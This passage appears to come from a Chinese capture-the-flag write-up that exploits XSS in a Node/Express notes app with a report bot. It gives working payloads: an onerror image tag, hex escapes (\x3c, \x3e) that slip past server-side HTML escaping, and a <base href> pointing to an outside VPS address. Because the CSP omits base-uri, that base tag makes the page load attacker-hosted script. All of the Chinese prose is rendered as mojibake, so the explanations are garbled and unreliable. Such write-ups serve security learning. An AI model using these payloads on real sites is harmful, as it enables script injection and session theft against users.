res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> id <span class="token operator">&lt;</span> notes<span class="token punctuation">.</span>length<span class="token punctuation">)</span> notes<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Missing url"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> url <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Bad request"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">await</span> bot<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"å‘é€æˆåŠŸ"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"An error occurred"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server running at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ‰¾é™åˆ¶æœ€ä¸¥é‡çš„åœ°æ–¹ï¼Œä¸€èˆ¬æ˜¯æˆ‘ä»¬è¦å®ç° xss çš„åœ°æ–¹ï¼ˆ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> listItems <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">content<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;li style="margin-bottom:15px;padding:10px;border:1px solid #ddd;border-radius:5px;background:#f9f9f9;">            &lt;a href="/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a>            &lt;div id='note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' class="note-content">&lt;/div>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST" style="display:inline;">                &lt;button type="submit" style="margin-left:10px;background:#ff4d4f;color:white;border:none;border-radius:3px;cursor:pointer;">Delete&lt;/button>            &lt;/form>            &lt;script src="/preview?index=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" nonce="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/script>        &lt;/li>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;html>    &lt;head>        &lt;title>ğŸ“’ Notes&lt;/title>        &lt;style>            body &#123; font-family: Arial, sans-serif; margin: 40px; &#125;            textarea &#123; width: 400px; height: 80px; &#125;            button &#123; margin-top: 5px; &#125;            ul &#123; list-style: none; padding: 0; &#125;        &lt;/style>    &lt;/head>    &lt;body>        &lt;h1>ğŸ“’ Notes&lt;/h1>        &lt;form action="/add" method="POST">            &lt;textarea name="content">&lt;/textarea>&lt;br>            &lt;button type="submit">Add Note&lt;/button>        &lt;/form>        &lt;hr>        &lt;ul>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>listItems<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/ul>    &lt;/body>    &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºä»€ä¹ˆä¼šå¯¹ä¸€ä¸ª &#x2F;preview è·¯ç”±é™åˆ¶å‘¢ï¼Œçœ‹çœ‹è¿™é‡Œçš„å®ç°ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/preview"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> index <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>index<span class="token punctuation">;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>    content<span class="token operator">=</span><span class="token function">escapeHTML</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> js <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    (function()&#123;        const el = document.getElementById('note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">');        if (!el) return;        const text = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        if (text.length > 50) &#123;            el.innerHTML = text.slice(0,50) + '...';        &#125; else &#123;            el.innerHTML = text;        &#125;    &#125;)();    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç®€åŒ–ä¸€ä¸‹å°±æ˜¯è¿™æ ·çš„ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ”¹ note-0 è¿™ä¸ª div é‡Œçš„ innerHTMLï¼Œå…¶ä¸­ text æˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“ xssï¼Œåªè¦ä½¿ç”¨é script å’Œ body æ ‡ç­¾çš„ payload æ‰“å°±è¡Œäº†</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'&lt;img src onerror="alert(1)">'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥é’ˆå¯¹é™åˆ¶è¿›è¡Œç»•è¿‡ï¼Œé¦–å…ˆæ˜¯è½¬ä¹‰ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> str        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;#39;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œæ˜¯åœ¨ nodejs ä¸Šè¿›è¡Œè½¬ä¹‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ä¼ å…¥çš„ content ä¸åœ¨è¿™ä¸ªèŒƒå›´å¹¶ä¸”èƒ½è¢« javscript æ”¯æŒè§£æå³å¯ï¼Œåå…­è¿›åˆ¶ç¼–ç å°±å¯ä»¥å®ç°</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'\x3cimg src onerror="alert(1)"\x3e'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ˜¯ CSPï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &lt;script src="/preview?index=$&#123;encodeURIComponent(index)&#125;&amp;content=$&#123;encodeURIComponent(content)&#125;" nonce="$&#123;res.locals.nonce&#125;">&lt;/script></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè®¾ç½®äº† default-srcã€script-srcã€style-srcï¼Œæ²¡è®¾ç½® base-uriï¼Œé‚£å°±å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œæ„é€  baseurl åŠ è½½æˆ‘ä»¬ vps ä¸Šçš„ js å®ç° xss</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>note-0<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>note-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>el<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token string">'\x3cbase href=http://192.168.1.154:8000\x3e'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ä¹‹åæ­¤æ—¶ä» html è®¿é—®çš„æ‰€æœ‰è·¯ç”±éƒ½æ˜¯åœ¨è‡ªå·±çš„ vps ä¸Šï¼Œç”±äºè¿™é‡Œå”¯ä¸€çš„ script src æ ‡ç­¾æ˜¯ <code>&lt;script 